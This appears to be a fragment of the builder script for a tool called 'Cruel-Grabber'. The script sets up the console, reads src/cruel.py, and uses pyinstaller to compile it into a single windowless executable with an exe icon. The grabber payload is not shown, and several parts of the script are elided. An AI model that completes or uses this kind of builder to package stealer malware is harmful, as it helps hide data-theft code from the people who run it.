...
os.system('title Cruel-Grabber Builder')
os.system("color b")
os.system("cls")
...
def main():
    ...
    try:
        with open(r'src/cruel.py', 'r') as file:
    ...
    os.system(f"pyinstaller --noconsole --onefile -n {file_name} -i icons/exe.ico src/cruel.py")
    os.system("cls")
